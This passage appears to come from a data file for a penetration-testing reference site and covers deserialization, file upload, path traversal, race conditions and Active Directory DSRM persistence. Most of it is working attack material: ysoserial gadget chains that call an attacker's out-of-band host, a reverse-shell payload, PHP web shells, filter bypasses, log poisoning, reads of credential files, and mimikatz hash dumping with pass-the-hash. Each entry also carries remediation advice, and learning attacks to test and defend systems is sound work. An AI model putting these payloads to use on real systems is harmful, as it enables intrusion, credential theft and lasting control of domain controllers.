              "Even without a code-exec gadget, tampering with the fields of a trusted serialized object (an authenticated=true flag, a role, a user id, a price) is an auth/logic bypass."
            ]
          },
          {
            title: "Where the Data Enters",
            type: "table",
            columns: ["Location", "Format / note"],
            rows: [
              ["Cookies / hidden fields", "Serialized session or state objects round-tripped through the client"],
              ["ASP.NET __VIEWSTATE", ".NET serialized state — attack with ysoserial.net (needs machineKey or unprotected VS)"],
              ["APIs / RPC / queues", "Java RMI/JMX, T3 (WebLogic), JMS/AMQP, gRPC payloads carrying objects"],
              ["File uploads / imports", "Session files, cache entries, or 'import' features that deserialize"],
              ["JSON with type info", "Json.NET TypeNameHandling, Jackson enableDefaultTyping, fastjson autoType"],
              ["Content-Type tells", "application/x-java-serialized-object; PHP unserialize() inputs; pickle loads"]
            ]
          },
          {
            title: "Step 1 — Detect the Sink (Safely)",
            type: "commands",
            commands: [
              { label: "Recognise serialized data", cmd: "# Java:  echo <cookie> | base64 -d | xxd | head   -> AC ED 00 05\n# PHP :  O:4:\"User\":2:{s:4:\"name\";...}   or  a:2:{...}\n# .NET :  __VIEWSTATE=/wEP...   Python: base64 that decodes to \\x80\\x04..." },
              { label: "Java: URLDNS confirmation (no code exec)", cmd: "java -jar ysoserial.jar URLDNS 'http://abcd.oastify.com' | base64 -w0\n# submit where the blob is accepted; a DNS lookup proves deserialization\n# URLDNS runs NO commands -> safe to fire on production" },
              { label: "PHP: harmless probe", cmd: "# if you can supply serialized input, a malformed object often throws a\n# revealing error; a __wakeup/__destruct with a side effect confirms the sink" },
              { label: "Map the classpath / dependencies", cmd: "# error messages, JS bundles, and version endpoints leak library names\n# knowing Commons-Collections/Spring/Groovy versions narrows the gadget" }
            ]
          },
          {
            title: "Step 2 — Find a Live Gadget Chain",
            type: "commands",
            commands: [
              { label: "Java (ysoserial) — spray likely chains via OOB", cmd: "for g in CommonsCollections5 CommonsCollections6 CommonsBeanutils1 Groovy1 Spring1 Hibernate1; do\n  java -jar ysoserial.jar $g \"nslookup $g.oob.attacker.com\" | base64 -w0\ndone\n# submit each; whichever fires the callback is the live chain on this classpath" },
              { label: ".NET (ysoserial.net)", cmd: "ysoserial.exe -p ViewState -g TypeConfuseDelegate \\\n  --path='/page.aspx' --apppath='/' --decryptionalg='AES' --decryptionkey='...' \\\n  --validationalg='SHA1' --validationkey='...' -c \"nslookup me.oob.attacker.com\"\n# for BinaryFormatter/Json.NET sinks: -f BinaryFormatter -g TypeConfuseDelegate" },
              { label: "PHP (phpggc)", cmd: "phpggc -l                       # list available gadget chains\nphpggc Laravel/RCE1 system id     # or Monolog/RCE, Symfony/RCE, WordPress/...\nphpggc -b Laravel/RCE1 system id  # base64 output ready to submit" },
              { label: "Python / Ruby", cmd: "# Python pickle (only if the app pickle.loads untrusted input):\n#   class E: def __reduce__(self): return (os.system,(\"id\",))\n#   base64(pickle.dumps(E()))\n# Ruby: Marshal.load / YAML.load of attacker data -> universal gadget chains" }
            ]
          },
          {
            title: "Step 3 — Weaponise (Authorised Only)",
            type: "commands",
            commands: [
              { label: "Swap the callback for a benign proof", cmd: "java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0\n# stop at 'id' / a DNS hit unless full exploitation is explicitly in scope" },
              { label: "Field tampering (no gadget needed)", cmd: "# PHP object injection: change O:4:\"User\":...s:5:\"admin\";b:0  ->  b:1\n# .NET/Java: flip a serialized role/authenticated field the app trusts on read" },
              { label: "Escalate to a shell", cmd: "# once a chain lands, run a reverse shell as the app process, then pivot\njava -jar ysoserial.jar CommonsCollections6 'bash -c {echo,<b64>}|{base64,-d}|bash'" }
            ]
          },
          {
            title: "Impact & Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Spot serialized data in cookies/state/API", "Candidate deserialization sink"],
              ["2", "Confirm with URLDNS / harmless probe", "Sink verified without running code"],
              ["3", "Identify a live gadget chain for the stack", "Code-execution (or field-tamper) primitive"],
              ["4", "Run a benign command / flip a trusted field", "RCE as the app, or auth/logic bypass"],
              ["5", "Reverse shell + pivot", "Host and internal-network compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["ysoserial", "Generate Java deserialization gadget payloads (incl. URLDNS)"],
              ["ysoserial.net", ".NET ViewState / BinaryFormatter / Json.NET payloads"],
              ["phpggc", "Generate PHP object-injection gadget chains for common frameworks"],
              ["Burp + Collaborator", "Detect blobs, decode, and confirm via OOB callbacks"],
              ["Freddy (Burp ext)", "Automatically flag deserialization sinks in traffic"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — Insecure deserialization (with labs)", url: "https://portswigger.net/web-security/deserialization" },
              { label: "OWASP — Deserialization Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html" },
              { label: "OWASP WSTG — Testing for Object Deserialization", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files" },
              { label: "PayloadsAllTheThings — Insecure Deserialization", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Do not deserialize untrusted data with a native serializer. Exchange data as JSON with a strict, explicit schema and no polymorphic type resolution.",
              "Disable dangerous type handling: Json.NET TypeNameHandling.None, Jackson without enableDefaultTyping (or activateDefaultTyping with a strict validator), fastjson safeMode, and avoid PHP unserialize() on user input (use json_decode).",
              "If native deserialization is unavoidable, use look-ahead / allow-list deserialization (e.g. Java's ObjectInputFilter, ValidatingObjectInputStream) that permits only the exact expected classes.",
              "Never round-trip trusted state through the client unprotected — sign it with a server-side keyed HMAC and verify before deserializing (and keep the ViewState MAC enabled with a secret machineKey).",
              "Keep gadget-prone libraries patched and remove unused dependencies to shrink the gadget surface; monitor deserialization advisories.",
              "Run the app with least privilege and isolation, and confirm findings with a benign OOB payload (URLDNS) rather than firing RCE on production."
            ]
          }
        ]
      },
      {
        id: "file-upload",
        name: "Unrestricted File Upload",
        severity: "High",
        ref: "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
        description: "Weak upload validation lets an attacker place executable or malicious files on the server.",
        brief: "An unrestricted file upload exists when an application accepts a file without adequately constraining its type, contents, name, and — critically — where it is stored and whether that location executes code. The headline impact is remote code execution: if an attacker can place a server-executable file (a web shell such as a .php, .jsp, or .aspx) into a directory the web server will execute, requesting that file runs their code with the web process's privileges.\n\nBut RCE is only the top of the ladder. Even when execution is prevented, weak upload handling yields: stored XSS (an SVG or HTML file served inline runs script in the app's origin); path/write traversal (a filename containing ../ overwrites files outside the intended directory, e.g. replacing index.php or another user's file); XXE (an SVG/DOCX parsed server-side); SSRF and image-library RCE (ImageTragick/ghostscript on a crafted image); denial of service (huge files, decompression bombs); and client-side malware distribution from a trusted domain.\n\nThe recurring failures are trusting the client-supplied filename or Content-Type, validating only the extension (or only with a blacklist), checking magic bytes but still executing the file, and — most importantly — storing uploads under the web root in an executable path with a predictable name. A robust design has to get several of these right at once.",
        quickReference: [
          { label: "Web shell (PHP)", cmd: "shell.php  ->  <?php system($_GET['c']); ?>" },
          { label: "Extension bypasses", cmd: "shell.php.jpg   shell.pHp   .phtml/.php5/.phar   shell.php%00.jpg   trailing dot/space" },
          { label: "Content-Type / magic-byte spoof", cmd: "Content-Type: image/png + GIF89a header prepended to PHP" },
          { label: "Non-RCE impact", cmd: "malicious.svg (stored XSS/XXE), ../ in filename (overwrite)" }
        ],
        sections: [
          {
            title: "Root Cause & What Makes It Dangerous",
            type: "notes",
            items: [
              "Two things must both go wrong for RCE: the app accepts a file it should reject, AND that file lands somewhere the server will execute (web root + handler for its extension).",
              "Client-supplied metadata is untrustworthy: the filename, extension, and Content-Type are all set by the attacker in the multipart request and mean nothing on their own.",
              "Extension checks fail in many ways: blacklists miss variants (.phtml, .php5, .phar, .pht, .asp;.jpg), allow-lists can be defeated by double extensions or parser quirks, and case/encoding tricks slip past naive matching.",
              "Magic-byte / image validation alone is insufficient — a valid image can carry a payload (polyglot) and still be interpreted as script if the extension/handler allows execution.",
              "Even non-executable uploads are dangerous: inline-served SVG/HTML = stored XSS; server-side parsing of SVG/Office = XXE; attacker-controlled filename = write traversal / overwrite."
            ]
          },
          {
            title: "Where to Look",
            type: "notes",
            items: [
              "Obvious uploads: profile/avatar images, document and attachment uploads, import features, resume/CV, bulk CSV/XML import, and 'attach a file' in support/ticketing.",
              "Less obvious: rich-text editors with image paste/upload, API endpoints that accept base64 file blobs, and signature/logo uploads in settings.",
              "After upload, always find WHERE the file is served (predictable path? under web root?) and WHETHER that directory executes scripts — that determines RCE vs XSS-only.",
              "Filename handling: does the app keep your filename? Then test ../ traversal and null bytes.",
              "Server-side processing: thumbnailing, PDF/preview generation, virus scanning, and format conversion are sinks for image-library RCE and XXE."
            ]
          },
          {
            title: "Step 1 — Baseline & Straight Shot",
            type: "commands",
            commands: [
              { label: "Upload a benign file and locate it", cmd: "# upload test.jpg, then find where it is served and how it's named:\nGET /uploads/test.jpg\n# note: predictable path? web-accessible? random filename? does the dir run scripts?" },
              { label: "Try a web shell directly", cmd: "# shell.php\n<?php system($_GET['c']); ?>\n# if accepted and the dir executes PHP:\nGET /uploads/shell.php?c=id   ->  uid=... = RCE\n# per stack: shell.jsp, shell.aspx, shell.phtml" },
              { label: "Test what the server actually checks", cmd: "# upload shell.php, then shell.jpg with PHP inside, then shell.php with a fake\n# image header — observe which are rejected to learn the filter (ext? MIME? bytes?)" }
            ]
          },
          {
            title: "Step 2 — Filter Bypasses",
            type: "commands",
            commands: [
              { label: "Extension tricks", cmd: "shell.php.jpg              # double extension (Apache mis-config picks .php)\nshell.phtml  shell.php5  shell.pht  shell.phar   # alternate executable exts\nshell.pHp                  # case (case-insensitive filesystems/handlers)\nshell.php%00.jpg           # null byte (old stacks)\nshell.php.                 # trailing dot / space (Windows strips it)\nshell.php;.jpg             # semicolon (old IIS)" },
              { label: "Content-Type & magic bytes", cmd: "# forge the multipart Content-Type header:\nContent-Type: image/png\n# prepend a real image signature so magic-byte checks pass:\nGIF89a;\n<?php system($_GET['c']); ?>\n# or inject PHP into EXIF: exiftool -Comment='<?php system($_GET[c]);?>' img.jpg" },
              { label: "Enable execution via config upload", cmd: "# where the dir won't run scripts, upload a config to turn it on:\n# Apache .htaccess:\nAddType application/x-httpd-php .jpg\n# IIS web.config with a handler mapping\n# then upload payload.jpg and request it" },
              { label: "Content/length & double-request tricks", cmd: "# race the AV/validation: request the file in the window before it's deleted\n# split validation: some apps validate one request but store another\n# overlong filenames / unicode to truncate past the checked extension" }
            ]
          },
          {
            title: "Step 3 — Impact Without RCE",
            type: "commands",
            commands: [
              { label: "Stored XSS via SVG/HTML", cmd: "# uploaded and served inline (image/svg+xml):\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>\n# fires in the app's origin whenever the image is viewed" },
              { label: "XXE via SVG/Office", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE svg [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>\n<svg><text>&x;</text></svg>\n# if the server rasterises the SVG, the file leaks (see XXE)" },
              { label: "Write traversal / overwrite", cmd: "filename=\"../../../var/www/html/index.php\"\nfilename=\"../../.ssh/authorized_keys\"\n# overwrite served or config files if the filename is trusted" },
              { label: "Image-library RCE & DoS", cmd: "# ImageTragick (CVE-2016-3714) via a crafted MVG/SVG passed to ImageMagick\n# decompression bomb (huge PNG/zip) or pixel-flood image -> memory DoS" }
            ]
          },
          {
            title: "Validation Bypass Reference",
            type: "table",
            columns: ["Check", "Bypass"],
            rows: [
              ["Extension allow-list", "Alternate exec exts (.phtml/.php5/.phar), double extension, case, parser quirks"],
              ["Extension blacklist", "One missed variant, or upload .htaccess/web.config to enable execution"],
              ["Client Content-Type", "Trivially forged in the multipart request"],
              ["Magic-byte check only", "Prepend a valid image header, append/EXIF the payload (polyglot)"],
              ["Filename trust", "../ write traversal to overwrite files outside the directory"],
              ["Validate-then-store gap", "Race the file in the window before deletion; TOCTOU"]
            ]
          },
          {
            title: "Impact & Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Upload a benign file, find its URL & exec behaviour", "Storage path + whether scripts run"],
              ["2", "Bypass validation with a web shell", "Server-side script stored in an exec path"],
              ["3", "Request the shell URL", "RCE as the web user"],
              ["4", "If exec blocked: SVG/HTML inline", "Stored XSS in the app origin"],
              ["5", "Reverse shell / read secrets", "Host compromise and pivot"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite", "Manipulate filename, Content-Type, and magic bytes in the multipart request"],
              ["fuxploider", "Automated upload-filter fuzzing and bypass discovery"],
              ["UploadScanner (Burp)", "Automated battery of malicious upload variants"],
              ["weevely", "Generate stealthy, obfuscated PHP web shells"],
              ["exiftool", "Embed payloads into image metadata for polyglots"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "OWASP — File Upload Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html" },
              { label: "OWASP — Unrestricted File Upload", url: "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" },
              { label: "PortSwigger — File upload vulnerabilities (with labs)", url: "https://portswigger.net/web-security/file-upload" },
              { label: "PayloadsAllTheThings — Upload Insecure Files", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Store uploads outside the web root (or in object storage / a dedicated non-executable origin) and serve them through a controlled handler — never let the upload directory execute scripts.",
              "Validate with a strict allow-list of permitted extensions AND verified content type / magic bytes, and reject anything else; do not rely on a blacklist.",
              "Generate a new random server-side filename and set the extension yourself; strip all directory components from the client filename so it can never influence the storage path.",
              "For images, re-encode/transcode them server-side (which strips embedded payloads and EXIF), and process with patched libraries configured to ignore embedded scripts/XML.",
              "Serve downloads with Content-Disposition: attachment, X-Content-Type-Options: nosniff, and a correct Content-Type so SVG/HTML cannot render inline in the app origin.",
              "Enforce size limits and guard against decompression bombs; run AV/malware scanning; and disable dangerous handlers (.htaccess override, PHP execution) in upload paths."
            ]
          }
        ]
      },
      {
        id: "path-traversal",
        name: "Path Traversal / LFI / RFI",
        severity: "High",
        ref: "https://portswigger.net/web-security/file-path-traversal",
        description: "User input in a file path escapes the intended directory to read (or include and execute) arbitrary files.",
        brief: "Path traversal (a.k.a. directory traversal or dot-dot-slash) occurs when user input is incorporated into a filesystem path and the application does not confine the result to the intended directory. By inserting ../ (or ..\\ on Windows) sequences, the attacker walks up the directory tree and out of the web root to reach arbitrary files. When those files are only read and returned, the impact is arbitrary file disclosure — this is Local File Inclusion (LFI) in read mode, leaking source code, configuration, credentials, /etc/passwd, SSH keys, and cloud config.\n\nThe severity rises sharply when the platform executes what it includes. In classic PHP, an include()/require() fed a traversal path executes the target as code — so if the attacker can point it at a file whose contents they control (an uploaded file, a poisoned log, /proc/self/environ, a PHP session file, or a php:// / data:// wrapper), LFI becomes remote code execution. Remote File Inclusion (RFI) is the rarer case where the include accepts a remote URL directly (needs allow_url_include), giving immediate RCE.\n\nThe defect is always the same: trusting user input to name a file. It hides in any parameter that selects a document, template, image, language file, theme, or download — file=, page=, template=, lang=, path=, download=, and in filenames within uploads and archives (zip-slip). Because filters are commonly bolted on and easily bypassed with encoding and nesting tricks, a superficial 'we strip ../' defence is rarely sufficient.",
        quickReference: [
          { label: "Basic traversal", cmd: "?file=../../../../etc/passwd     ?page=..\\..\\..\\windows\\win.ini" },
          { label: "Encoding bypasses", cmd: "%2e%2e%2f   ..%252f (double)   ....//   ..%c0%af (overlong)   %2e%2e/" },
          { label: "PHP source exfil", cmd: "php://filter/convert.base64-encode/resource=index.php" },
          { label: "LFI -> RCE", cmd: "poison a log/UA/session or use php://input|data://, then include it" }
        ],
        sections: [
          {
            title: "Root Cause & Concepts",
            type: "notes",
            items: [
              "The app concatenates user input into a path — open(base + input) or include(input) — without canonicalising and confining the result, so ../ escapes the intended base directory.",
              "Read vs execute is the key distinction: a read sink (readfile, sendFile, fopen) yields file disclosure; an execute sink (PHP include/require, template loaders) can yield code execution.",
              "LFI = include a LOCAL file; RFI = include a REMOTE URL (needs allow_url_include=On, now off by default). Both stem from the same unvalidated-path root cause.",
              "PHP stream wrappers turn LFI into powerful primitives: php://filter reads source without executing it; php://input and data:// let you supply code to execute; expect:// runs commands where enabled.",
              "Depth matters less than you think — prepend many ../ (they are harmless once at /) or use an absolute path if the code does not force a prefix."
            ]
          },
          {
            title: "Where to Look",
            type: "notes",
            items: [
              "Parameters that name a resource: ?file=, ?page=, ?template=, ?lang=, ?theme=, ?doc=, ?path=, ?download=, ?img=, ?include=.",
              "File download and 'view document' endpoints, report/invoice exporters, and image loaders that take a filename.",
              "Upload handlers where you control the stored filename (../ in the filename = write traversal / overwrite), and archive extractors (zip-slip: ../ inside zip entry names).",
              "Language/locale and theme selectors that map a value to a file on disk.",
              "Anywhere a value ends up in a server-side path — including values from headers, cookies, and JSON, not just query strings."
            ]
          },
          {
            title: "Step 1 — Confirm Arbitrary Read",
            type: "commands",
            commands: [
              { label: "Basic traversal (Linux / Windows)", cmd: "?file=../../../../../../etc/passwd\n?file=..\\..\\..\\..\\windows\\win.ini\n# a returned root:x:0:0 or [fonts] confirms traversal" },
              { label: "High-value read targets", cmd: "/etc/passwd  /etc/hosts  /proc/self/environ  /proc/self/cmdline\n~/.ssh/id_rsa  ~/.aws/credentials  ~/.bash_history\n/var/www/html/config.php  .env  web.config  /etc/shadow (if root)" },
              { label: "If a prefix/extension is forced", cmd: "# app does: include('/pages/' + file + '.php')\n# escape the directory and strip the suffix:\n?file=../../../../etc/passwd%00        # null byte (old PHP < 5.3.4)\n?file=../../../../etc/passwd           # if the .php suffix isn't appended to wrappers\n# path-truncation / dot padding on very old stacks" },
              { label: "Absolute path", cmd: "# if no base prefix is enforced, skip traversal entirely:\n?file=/etc/passwd\n?file=file:///etc/passwd" }
            ]
          },
          {
            title: "Step 2 — Filter & Encoding Bypass",
            type: "commands",
            commands: [
              { label: "URL / double encoding", cmd: "?file=..%2f..%2fetc%2fpasswd            # encoded slash\n?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd     # encoded dots+slash\n?file=..%252f..%252fetc%252fpasswd       # double-encoded (server decodes twice)" },
              { label: "Defeat naive strip-once filters", cmd: "# if the app strips '../' exactly once, nest it so a strip re-forms it:\n?file=....//....//etc/passwd\n?file=..././..././etc/passwd\n?file=..\\/..\\/etc/passwd" },
              { label: "Overlong UTF-8 / alternate separators", cmd: "?file=..%c0%af..%c0%afetc%c0%afpasswd    # overlong-encoded slash\n# Windows accepts both / and \\ ; try mixing them" },
              { label: "Confuse allow-list checks", cmd: "# if it must START WITH the base dir, include it then traverse out:\n?file=/var/www/images/../../../etc/passwd" }
            ]
          },
          {
            title: "Step 3 — Escalate LFI to RCE",
            type: "commands",
            commands: [
              { label: "Exfiltrate source (no execution)", cmd: "?file=php://filter/convert.base64-encode/resource=index.php\n?file=php://filter/convert.base64-encode/resource=../config/db.php\n# base64-decode the response to read config + DB creds" },
              { label: "Direct code via wrappers", cmd: "# php://input: put PHP in the POST body\nPOST ?file=php://input\n<?php system($_GET['c']); ?>\n# data:// wrapper (needs allow_url_include):\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+" },
              { label: "Log poisoning", cmd: "# 1) send a request whose User-Agent is <?php system($_GET['c']);?>\n# 2) include the log so it executes:\n?file=/var/log/apache2/access.log&c=id\n?file=/var/log/nginx/access.log" },
              { label: "Other includable, controllable files", cmd: "?file=/proc/self/environ          # poison via User-Agent\n?file=/tmp/sess_<PHPSESSID>        # PHP session file you can seed\n?file=/var/lib/php/sessions/sess_..\n# or include a file you uploaded through another feature" }
            ]
          },
          {
            title: "LFI vs RFI vs Wrappers",
            type: "table",
            columns: ["Variant", "Detail"],
            rows: [
              ["LFI (read)", "Read a local file — source, config, /etc/passwd, keys, cloud creds"],
              ["LFI to RCE", "Include controllable content: uploaded file, poisoned log, /proc/self/environ, PHP session"],
              ["RFI", "Include a remote URL (needs allow_url_include) — direct RCE, rare by default"],
              ["php://filter", "Base64-exfiltrate source without executing it"],
              ["php://input / data://", "Supply PHP code to execute"],
              ["zip-slip / write traversal", "../ in an uploaded/extracted filename overwrites arbitrary files"]
            ]
          },
          {
            title: "Impact & Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Inject ../ into a file parameter", "Read outside the base directory"],
              ["2", "Bypass encoding / strip filters", "Reliable arbitrary file read"],
              ["3", "Exfiltrate source & config (php://filter)", "Credentials, keys, DB config disclosed"],
              ["4", "Include controllable content / poisoned log", "LFI -> remote code execution"],
              ["5", "Use disclosed secrets", "Lateral movement, cloud/DB access"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite", "Manual traversal, encoding, and wrapper testing"],
              ["ffuf / Burp Intruder", "Fuzz path parameters with a traversal/LFI wordlist"],
              ["dotdotpwn", "Automated traversal fuzzer across encodings and OSes"],
              ["LFISuite / liffy", "Automate LFI-to-RCE (log poisoning, wrappers)"],
              ["SecLists (LFI/traversal lists)", "Payload and target wordlists"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — File path traversal (with labs)", url: "https://portswigger.net/web-security/file-path-traversal" },
              { label: "OWASP WSTG — Testing for Local/Remote File Inclusion", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" },
              { label: "OWASP — Path Traversal", url: "https://owasp.org/www-community/attacks/Path_Traversal" },
              { label: "PayloadsAllTheThings — File Inclusion", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Do not build filesystem paths from user input. Map an opaque input key to a fixed server-side allow-list of permitted files (e.g. {'report':'/data/report.pdf'}), and serve only from that map.",
              "If a path component is unavoidable, canonicalise the full resolved path (realpath / Path.normalize) and verify it still starts with the intended base directory before opening it — reject otherwise.",
              "After decoding, reject any input containing path separators, '..', null bytes, absolute paths, or scheme wrappers (php://, data://, file://, http://).",
              "Disable dangerous PHP features: allow_url_include=Off and allow_url_fopen=Off; avoid include()/require() on any user-influenced value.",
              "For uploads and archive extraction, sanitise entry filenames and resolve+confine the destination path to prevent write traversal / zip-slip.",
              "Run the app with least filesystem privilege and keep secrets out of web-served directories so a read primitive yields as little as possible."
            ]
          }
        ]
      },
      {
        id: "race-condition",
        name: "Race Conditions",
        severity: "Medium",
        ref: "https://portswigger.net/web-security/race-conditions",
        description: "Concurrent requests hit a check-then-act window, letting a limited action happen more times than allowed.",
        brief: "A race condition (TOCTOU — time-of-check to time-of-use) exists when an application checks a condition and then acts on it non-atomically, so two requests sent close together both pass the check before either completes the action. The result is a limit enforced once being applied many times: a gift card redeemed twice, a single-use coupon reused, a withdrawal exceeding the balance.\n\nImpact: financial loss, limit and single-use bypass, and inconsistent data. Modern tooling (Burp's single-packet attack / Turbo Intruder) makes these windows exploitable even when they are only microseconds wide.",
        quickReference: [
          { label: "The idea", cmd: "Send N identical requests simultaneously to beat a check-then-act gap" },
          { label: "Tooling", cmd: "Burp Repeater 'Send group in parallel' (single-packet attack); Turbo Intruder" },
          { label: "Classic targets", cmd: "Redeem code/coupon, apply discount, withdraw/transfer, vote/like, register username" },
          { label: "Signal", cmd: "The action succeeds more times than the limit should allow" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Identify a limited, valuable action", cmd: "# anything with a 'once' or a cap tied to money/entitlement:\nPOST /giftcard/redeem   code=ABC        # single-use\nPOST /account/withdraw  amount=100       # balance-checked\nPOST /coupon/apply      code=WELCOME10   # one per account" },
              { label: "2. Stage identical requests as a group", cmd: "# Burp: send the request to Repeater, duplicate the tab N times,\n# add all tabs to a group, then 'Send group in parallel (single-packet attack)'\n# this lands ~20 requests within the same server-side window" },
              { label: "3. Or use Turbo Intruder for precision", cmd: "# engine.queue with 100% gate to release all requests together:\n#   for i in range(20): engine.queue(target.req)\n#   engine.openGate()  # fire simultaneously\n# tune concurrency to widen the successful window" },
              { label: "4. Compare against the baseline", cmd: "# did the benefit apply more times than allowed?\n# balance credited twice, coupon accepted 5x, two accounts with the same username\n# more successes than the limit = exploitable race" },
              { label: "5. Weaponise / quantify impact", cmd: "# repeat to establish reliability and magnitude (e.g. Nx over-redemption)\n# report the count and monetary impact; stop at a clear proof" }
            ]
          },
          {
            title: "Vulnerable Patterns",
            type: "table",
            columns: ["Pattern", "Example"],
            rows: [
              ["Limit check then apply", "Balance/quantity/quota verified, then decremented in a separate step"],
              ["Single-use tokens", "Coupon/gift-card marked used after the benefit is granted"],
              ["Uniqueness checks", "Register the same username/email in parallel before the unique constraint bites"],
              ["State transitions", "Approve/cancel/refund fired concurrently to reach an inconsistent state"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find a capped/single-use action", "Candidate TOCTOU window"],
              ["2", "Fire N requests in parallel", "Multiple pass the check"],
              ["3", "Compare to the allowed limit", "Limit applied many times"],
              ["4", "Repeat for magnitude", "Quantified financial impact"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite (single-packet attack)", "Land many requests in one server-side window"],
              ["Turbo Intruder", "Scripted, gated high-precision concurrency"],
              ["custom async scripts", "Reproduce parallel request bursts"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — Race conditions", url: "https://portswigger.net/web-security/race-conditions" },
              { label: "PortSwigger — Smashing the state machine (single-packet attack)", url: "https://portswigger.net/research/smashing-the-state-machine" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Make check-and-act atomic: use database transactions with appropriate isolation, or atomic operations (SELECT ... FOR UPDATE, conditional updates).",
              "Enforce uniqueness and limits with database constraints, not application-level checks alone.",
              "Use idempotency keys for sensitive operations so repeats are safely ignored.",
              "Lock or serialise per-resource operations (e.g. per-account) where a race would be costly.",
              "Test concurrency explicitly with parallel requests as part of security testing."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Active Directory",
    vulns: [
      {
        id: "dsrm-persistence",
        name: "DSRM Administrator Persistence",
        severity: "High",
        ref: "https://adsecurity.org/?p=1714",
        description: "The DSRM local administrator on a domain controller can be turned into a stealthy backdoor that logs on to the DC with a static, rarely-rotated hash.",
        brief: "Every domain controller keeps a local Administrator account used for Directory Services Restore Mode (DSRM) — a break-glass account whose password is set at promotion and almost never changed. Its NTLM hash lives in the DC's local SAM. With Domain Admin access an attacker dumps that hash and, after a one-line registry change, uses it to authenticate to the DC over the network as its local Administrator.\n\nImpact: durable administrative persistence on a domain controller that survives domain-account password resets and is easy to miss, because it is a legitimate built-in account. It requires existing DA/DC access, so it is a persistence and re-entry technique rather than an escalation.",
        quickReference: [
          { label: "Dump the DSRM hash (on the DC)", cmd: "lsadump::sam            # mimikatz — DSRM = local Administrator on the DC" },
          { label: "Allow DSRM network logon", cmd: "reg: HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior = 2" },
          { label: "Re-enter with the hash", cmd: "sekurlsa::pth /domain:<dc-name> /user:Administrator /ntlm:<hash> /run:cmd.exe" },
          { label: "Verify", cmd: "Authenticate to the DC as <dc-name>\\Administrator (local)" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. From a DC session, dump the local SAM (DSRM account)", cmd: "# DSRM password is mapped to the DC's LOCAL Administrator and stored in the SAM hive\nprivilege::debug\ntoken::elevate\nlsadump::sam            # note the Administrator RID-500 NTLM hash\n# via Sliver: package mimikatz with PEzor -> execute-assembly on the <dc> session" },
              { label: "2. Change the DSRM logon behaviour on the DC", cmd: "# by default the DSRM account cannot log on over the network; flip the registry value\n# Sliver: registry write on the DC session\nregistry write --hive HKLM --type dword \\\n  \"System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\DsrmAdminLogonBehavior\" 2\n# 2 = the DSRM admin may log on like a normal local account" },
              { label: "3. Re-enter later with pass-the-hash as the DSRM admin", cmd: "# use the RID-500 hash to spawn a process as the DC's local Administrator\nsekurlsa::pth /domain:<dc-hostname> /user:Administrator \\\n  /ntlm:<dsrm-ntlm-hash> /run:C:\\Windows\\System32\\cmd.exe\n# then inject a C2 payload into that process for admin access on the DC" },
              { label: "4. Confirm persistence", cmd: "# the DSRM hash is static and unaffected by domain password resets\n# it stays valid until DSRM is explicitly reset -> a durable DC re-entry path" }
            ]
          },
          {
            title: "Why It Works",
            type: "table",
            columns: ["Fact", "Consequence"],
            rows: [
              ["DSRM password set at DC promotion", "Rarely rotated afterwards — a long-lived static credential"],
              ["Stored in the DC's local SAM", "Recoverable with lsadump::sam once you have DC access"],
              ["Local account, not a domain account", "Domain-wide password resets and krbtgt rotation don't invalidate it"],
              ["DsrmAdminLogonBehavior = 2", "Removes the 'restore mode only' restriction, enabling normal/network logon"],
              ["Built-in Administrator", "Blends in — easy to overlook during response"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Obtain DA / DC access", "Prerequisite foothold on the DC"],
